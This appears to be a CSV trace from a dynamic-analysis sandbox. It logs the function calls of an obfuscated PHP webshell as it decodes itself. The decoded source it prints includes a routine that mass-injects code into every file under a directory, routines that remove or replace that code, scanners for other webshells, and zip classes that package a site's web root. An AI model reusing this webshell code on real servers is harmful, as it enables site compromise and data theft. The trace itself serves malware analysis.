uuid,file_md5,index,source,target,argc,argv,return,dynamic
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,697,wzzbxl,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){\r\n\t$show = do_show($dir);\r\n\tforeach($show as $file""]]}",{"value": "\\x00lambda_41"},"[0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,698,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){\r\n\t$show = do_show($dir);\r\n\tforeach($show as $files){\r\n\t\tif(is_dir($files) && $bool){\r\n\t\t\tdo_passreturn($files,$code,$type,$bool,$filetype,$shell);\r\n\t\t}else{\r\n\t\t\tif($files == $shell) continue;\r\n\t\t\tswitch($type){\r\n\t\t\t\tcase \""guama\"":\r\n\t\t\t\tif(debug($files,$filetype)){\r\n\t\t\t\t\tdo_write($files,\""ab\"",\""\\n\"".$code) ? html_n(JmCode(\""=NvCg0vc5z8f\"").$files.JmCode(\""==tClWTC\"")) : html_n(JmCode(\""=NvCg0P3jrdl\"").$files.JmCode(\""==tClWTC\""));\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""qingma\"":\r\n\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\tif(stristr($filecode,$code)){\r\n\t\t\t\t\t$newcode = str_replace($code,'',$filecode);\r\n\t\t\t\t\tdo_write($files,\""wb\"",$newcode) ? html_n(JmCode(\""=NvCg0vc5z8f\"").$files.JmCode(\""==tClWTC\"")) : html_n(JmCode(\""=NvCg0P3jrdl\"").$files.JmCode(\""==tClWTC\""));\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""tihuan\"":\r\n\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\tif(stristr($filecode,$code)){\r\n\t\t\t\t\t$newcode = str_replace($code,$filetype,$filecode);\r\n\t\t\t\t\tdo_write($files,\""wb\"",$newcode) ? html_n(JmCode(\""=NvCg0vc5z8f\"").$files.JmCode(\""==tClWTC\"")) : html_n(JmCode(\""=NvCg0P3jrdl\"").$files.JmCode(\""==tClWTC\""));\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""scanfile\"":\r\n\t\t\t\t$file = explode('/',$files);\r\n\t\t\t\tif(stristr($file[count($file)-1],$code)){\r\n\t\t\t\t\thtml_a(JmCode(\""==DCjMvp0yTMy1wpyMaouI2C\"").$files,$files);\r\n\t\t\t\t\techo '<br>';\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""scancode\"":\r\n\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\tif(stristr($filecode,$code)){\r\n\t\t\t\t\thtml_a(JmCode(\""==DCjMvp0yTMy1wpyMaouI2C\"").$files,$files);\r\n\t\t\t\t\techo '<br>';\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""scanphp\"":\r\n\t\t\t\t$fileinfo = pathinfo($files);\r\n\t\t\t\tif($fileinfo['extension'] == $code){\r\n\t\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\t\tif(muma($filecode,$code)){\r\n\t\t\t\t\t\thtml_a(JmCode(\""==DCjMvp0yTMy1wpyMaouI2C\"").urlencode($files),JmCode(\""==De8Prf\""));\r\n\t\t\t\t\t\thtml_a(JmCode(\""=0QpzjJMx1wpyMaouI2C\"").urlencode($files),JmCode(\""==D/m6ol\""));\r\n\t\t\t\t\t\techo $files.'<br>';\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}}""]]}",{"value": "003E"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,699,wzzbxl,__lambda_func,0,{"value": []},{"value": "void"},[]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,700,eval,wzzbxl,2,"{""value"": [[0, ""DtrIng"", ""9OvPA0KPX0jBcNaM+0lpcuTqxtFMm9TowMJPWbDQ7xvp0AUMhITWhVUqmWKnx5GYmyTn0EPYjMzCgZKnbEUWbHTqcW3qzyDPX0tPAfwVjNQrpOQZ4kyVWxDPWxtPA4PVc4""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,701,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,702,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,703,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,704,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,705,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,706,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,707,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,708,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,709,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,710,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,711,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""9OvPA0KPX0jBcNaM+0lpcuTqxtFMm9TowMJPWbDQ7xvp0AUMhITWhVUqmWKnx5GYmyTn0EPYjMzCgZKnbEUWbHTqcW3qzyDPX0tPAfwVjNQrpOQZ4kyVWxDPWxtPA4PVc4""]]}",{"value": "L2kup3ZtHRuDrzyjrj0XQDbWqzSlVPEznJkyK2AiqJ50VQ0tZPN7QDbWqzSlVPExLKEup3ElK2kyovNtVQ0tZQfAPty2LKVtWTEcpaA0py9fMJ4tCFNjBj0XPKMupvNxMz"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,712,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""L2kup3ZtHRuDrzyjrj0XQDbWqzSlVPEznJkyK2AiqJ50VQ0tZPN7QDbWqzSlVPExLKEup3ElK2kyovNtVQ0tZQfAPty2LKVtWTEcpaA0py9fMJ4tCFNjBj0XPKMupvNxMz""]]}",{"value": "Y2xhc3MgUEhQemlwew0KDQoJdmFyICRmaWxlX2NvdW50ID0gMCA7DQoJdmFyICRkYXRhc3RyX2xlbiAgID0gMDsNCgl2YXIgJGRpcnN0cl9sZW4gPSAwOw0KCXZhciAkZm"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,713,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""Y2xhc3MgUEhQemlwew0KDQoJdmFyICRmaWxlX2NvdW50ID0gMCA7DQoJdmFyICRkYXRhc3RyX2xlbiAgID0gMDsNCgl2YXIgJGRpcnN0cl9sZW4gPSAwOw0KCXZhciAkZm""]]}",{"value": "class PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; \r\n\tvar $gzfilename;"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,714,wzzbxl,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""class PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; \r\n\tvar $gzfilename;""]]}",{"value": "\\x00lambda_42"},"[0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,715,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){class PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; \r\n\tvar $gzfilename;\r\n\tvar $fp;\r\n\tvar $dirstr='';\r\n    function unix2DosTime($unixtime = 0) {\r\n        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);\r\n\r\n        if ($timearray['year'] < 1980) {\r\n        \t$timearray['year']    = 1980;\r\n        \t$timearray['mon']     = 1;\r\n        \t$timearray['mday']    = 1;\r\n        \t$timearray['hours']   = 0;\r\n        \t$timearray['minutes'] = 0;\r\n        \t$timearray['seconds'] = 0;\r\n        }\r\n\r\n        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |\r\n               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);\r\n    }\r\n\r\n\tfunction startfile($path = 'wwwroot.zip'){\r\n\t\t$this->gzfilename=$path;\r\n\t\tif($this->fp=@fopen($this->gzfilename,\""w\"")){\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\r\n    function addfile($data, $name){\r\n        $name     = str_replace('\\\\', '/', $name);\r\n\t\t\r\n\t\tif(strrchr($name,'/')=='/') return $this->adddir($name);\r\n\t\t\r\n        $dtime    = dechex($this->unix2DosTime());\r\n        $hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x' . $dtime[2] . $dtime[3]  . '\\x' . $dtime[0] . $dtime[1];\r\n        eval('$hexdtime = \""' . $hexdtime . '\"";');\r\n        $unc_len = strlen($data);\r\n        $crc     = crc32($data);\r\n        $zdata   = gzcompress($data);\r\n        $c_len   = strlen($zdata);\r\n        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t\r\n        $datastr  = \""\\x50\\x4b\\x03\\x04\"";\r\n        $datastr .= \""\\x14\\x00\""; \r\n        $datastr .= \""\\x00\\x00\"";\r\n        $datastr .= \""\\x08\\x00\""; \r\n        $datastr .= $hexdtime; \r\n        $datastr .= pack('V', $crc);\r\n        $datastr .= pack('V', $c_len);\r\n        $datastr .= pack('V', $unc_len);\r\n        $datastr .= pack('v', strlen($name));\r\n        $datastr .= pack('v', 0); \r\n        $datastr .= $name;\r\n        $datastr .= $zdata;\r\n        $datastr .= pack('V', $crc); \r\n        $datastr .= pack('V', $c_len);\r\n        $datastr .= pack('V', $unc_len);\r\n\r\n\r\n\t\tfwrite($this->fp,$datastr);\r\n\t\t$my_datastr_len = strlen($datastr);\r\n\t\tunset($datastr);\r\n\t\t\r\n        $dirstr  = \""\\x50\\x4b\\x01\\x02\"";\r\n        $dirstr .= \""\\x00\\x00\""; \r\n        $dirstr .= \""\\x14\\x00\"";\r\n        $dirstr .= \""\\x00\\x00\"";\r\n        $dirstr .= \""\\x08\\x00\"";\r\n        $dirstr .= $hexdtime;\r\n        $dirstr .= pack('V', $crc); \r\n        $dirstr .= pack('V', $c_len); \r\n        $dirstr .= pack('V', $unc_len);\r\n        $dirstr .= pack('v', strlen($name) );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('V', 32 );\r\n        $dirstr .= pack('V',$this->datastr_len );\r\n        $dirstr .= $name;\r\n\t\t\r\n\t\t$this->dirstr .= $dirstr;\r\n\t\t\r\n\t\t$this -> file_count ++;\r\n\t\t$this -> dirstr_len += strlen($dirstr);\r\n\t\t$this -> datastr_len += $my_datastr_len;\t\r\n    }\r\n\r\n\tfunction adddir($name){ \r\n\t\t$name = str_replace(\""\\\\\"", \""/\"", $name); \r\n\t\t$datastr = \""\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\""; \r\n\t\t\r\n\t\t$datastr .= pack(\""V\"",0).pack(\""V\"",0).pack(\""V\"",0).pack(\""v\"", strlen($name) ); \r\n\t\t$datastr .= pack(\""v\"", 0 ).$name.pack(\""V\"", 0).pack(\""V\"", 0).pack(\""V\"", 0); \r\n\r\n\t\tfwrite($this->fp,$datastr);\r\n\t\t$my_datastr_len = strlen($datastr);\r\n\t\tunset($datastr);\r\n\t\t\r\n\t\t$dirstr = \""\\x50\\x4b\\x01\\x02\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\""; \r\n\t\t$dirstr .= pack(\""V\"",0).pack(\""V\"",0).pack(\""V\"",0).pack(\""v\"", strlen($name) ); \r\n\t\t$dirstr .= pack(\""v\"", 0 ).pack(\""v\"", 0 ).pack(\""v\"", 0 ).pack(\""v\"", 0 ); \r\n\t\t$dirstr .= pack(\""V\"", 16 ).pack(\""V\"",$this->datastr_len).$name; \r\n\t\t\r\n\t\t$this->dirstr .= $dirstr;\r\n\r\n\t\t$this -> file_count ++;\r\n\t\t$this -> dirstr_len += strlen($dirstr);\r\n\t\t$this -> datastr_len += $my_datastr_len;\t\r\n\t}\r\n\r\n\r\n\tfunction createfile(){\r\n\t\t$endstr = \""\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\"" .\r\n\t\t\t\t\tpack('v', $this -> file_count) .\r\n\t\t\t\t\tpack('v', $this -> file_count) .\r\n\t\t\t\t\tpack('V', $this -> dirstr_len) .\r\n\t\t\t\t\tpack('V""]]}",{"value": "003E"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,716,wzzbxl,__lambda_func,0,{"value": []},{"value": "void"},[]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,717,eval,wzzbxl,2,"{""value"": [[0, ""DtrIng"", ""=0aPA0KPX0jBvNQZ4kSZjtUKv4FXcRTquETWb4JMfWUqmOPYaL1Wbf2LuOaYcxvpcETolE3Lxtvoykzp0AUVfpvIatlnwSTphxFXlyTMskzp0ATV+0PVmyTn0EPXz9JM6y""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,718,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,719,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,720,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,721,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,722,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,723,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,724,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,725,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,726,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,727,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,728,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""=0aPA0KPX0jBvNQZ4kSZjtUKv4FXcRTquETWb4JMfWUqmOPYaL1Wbf2LuOaYcxvpcETolE3Lxtvoykzp0AUVfpvIatlnwSTphxFXlyTMskzp0ATV+0PVmyTn0EPXz9JM6y""]]}",{"value": "L2kup3ZtMJShqzIlrj0XVPNtVPNtqzSlVPEiqKD9Wlp7QDbtVPNtMaIhL3Eco24tMJShqzIlXPExnKVcrj0XPJyzXROzqJ5wqTyioy9yrTymqUZbW2q6L29gpUWyp3ZaXF"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,729,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""L2kup3ZtMJShqzIlrj0XVPNtVPNtqzSlVPEiqKD9Wlp7QDbtVPNtMaIhL3Eco24tMJShqzIlXPExnKVcrj0XPJyzXROzqJ5wqTyioy9yrTymqUZbW2q6L29gpUWyp3ZaXF""]]}",{"value": "Y2xhc3MgZWFudmVyew0KICAgICAgdmFyICRvdXQ9Jyc7DQogICAgZnVuY3Rpb24gZWFudmVyKCRkaXIpew0KCWlmKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKS"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,730,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""Y2xhc3MgZWFudmVyew0KICAgICAgdmFyICRvdXQ9Jyc7DQogICAgZnVuY3Rpb24gZWFudmVyKCRkaXIpew0KCWlmKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKS""]]}",{"value": "class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforea"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,731,wzzbxl,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforea""]]}",{"value": "\\x00lambda_43"},"[0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,732,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforeach($dir as $file){\r\n\t\tif(is_file($file)){\r\n\t\t\t$filecode = implode('',@file($file));\r\n\t\t\tif(is_array($dir)) $file = basename($file);\r\n\t\t\t$this -> filezip($filecode,$file);\r\n\t\t}\r\n\t}\r\n\t$this->out = $this -> packfile();\r\n\t}\r\n\treturn true;\r\n\t}\r\n\telse return false;\r\n    }\r\n\tvar $datasec      = array();\r\n\tvar $ctrl_dir     = array();\r\n\tvar $eof_ctrl_dir = \""\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\"";\r\n\tvar $old_offset   = 0;\r\n\tfunction at($atunix = 0) {\r\n\t\t$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);\r\n\t\tif ($unixarr['year'] < 1980) {\r\n\t\t\t$unixarr['year']    = 1980;\r\n\t\t\t$unixarr['mon']     = 1;\r\n\t\t\t$unixarr['mday']    = 1;\r\n\t\t\t$unixarr['hours']   = 0;\r\n\t\t\t$unixarr['minutes'] = 0;\r\n\t\t\t$unixarr['seconds'] = 0;\r\n\t\t} \r\n\t\treturn (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |\r\n\t\t\t\t($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);\r\n\t}\r\n\tfunction filezip($data, $name, $time = 0) {\r\n\t\t$name = str_replace('\\\\', '/', $name);\r\n\t\t$dtime = dechex($this->at($time));\r\n\t\t$hexdtime\t= '\\x' . $dtime[6] . $dtime[7]\r\n\t\t\t\t\t. '\\x' . $dtime[4] . $dtime[5]\r\n\t\t\t\t\t. '\\x' . $dtime[2] . $dtime[3]\r\n\t\t\t\t\t. '\\x' . $dtime[0] . $dtime[1];\r\n\t\teval('$hexdtime = \""' . $hexdtime . '\"";');\r\n\t\t$fr\t= \""\\x50\\x4b\\x03\\x04\"";\r\n\t\t$fr\t.= \""\\x14\\x00\"";\r\n\t\t$fr\t.= \""\\x00\\x00\"";\r\n\t\t$fr\t.= \""\\x08\\x00\"";\r\n\t\t$fr\t.= $hexdtime;\r\n\t\t$unc_len = strlen($data);\r\n\t\t$crc = crc32($data);\r\n\t\t$zdata = gzcompress($data);\r\n\t\t$c_len = strlen($zdata);\r\n\t\t$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$fr .= pack('v', strlen($name));\r\n\t\t$fr .= pack('v', 0);\r\n\t\t$fr .= $name;\r\n\t\t$fr .= $zdata;\r\n\t\t$fr .= pack('V', $crc);\r\n\t\t$fr .= pack('V', $c_len);\r\n\t\t$fr .= pack('V', $unc_len);\r\n\t\t$this -> datasec[] = $fr;\r\n\t\t$new_offset = strlen(implode('', $this->datasec));\r\n\t\t$cdrec = \""\\x50\\x4b\\x01\\x02\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x14\\x00\"";\r\n\t\t$cdrec .= \""\\x00\\x00\"";\r\n\t\t$cdrec .= \""\\x08\\x00\"";\r\n\t\t$cdrec .= $hexdtime;\r\n\t\t$cdrec .= pack('V', $crc);\r\n\t\t$cdrec .= pack('V', $c_len);\r\n\t\t$cdrec .= pack('V', $unc_len);\r\n\t\t$cdrec .= pack('v', strlen($name) );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('v', 0 );\r\n\t\t$cdrec .= pack('V', 32 );\r\n\t\t$cdrec .= pack('V', $this -> old_offset );\r\n\t\t$this -> old_offset = $new_offset;\r\n\t\t$cdrec .= $name;\r\n\t\t$this -> ctrl_dir[] = $cdrec;\r\n\t}\r\n\tfunction packfile(){\r\n\t\t$data    = implode('', $this -> datasec);\r\n\t\t$ctrldir = implode('', $this -> ctrl_dir);\r\n\t\treturn $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data)).\""\\x00\\x00\"";\r\n\t}\r\n}}""]]}",{"value": "003E"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,733,wzzbxl,__lambda_func,0,{"value": []},{"value": "void"},[]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,734,eval,wzzbxl,2,"{""value"": [[0, ""DtrIng"", ""=0aPA0UVX0jByIap0OvolIUqyWKPX0jBv4wpvkGKy1JLhITocM2JlITMuITnx8TqxNvBSkHFTWPViu2LyytPAfmXeNlpykJnz9SouE3o05GYmyTn0EFPX0DPX0DsWbDQ9y""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,735,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,736,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,737,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,738,wzzbxl,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,739,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,740,wzzbxl,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,741,wzzbxl,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
ea749329968e6705e697c5a1af9ce1d5,3547689597271ea257b03926f8d74470,742,wzzbxl,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
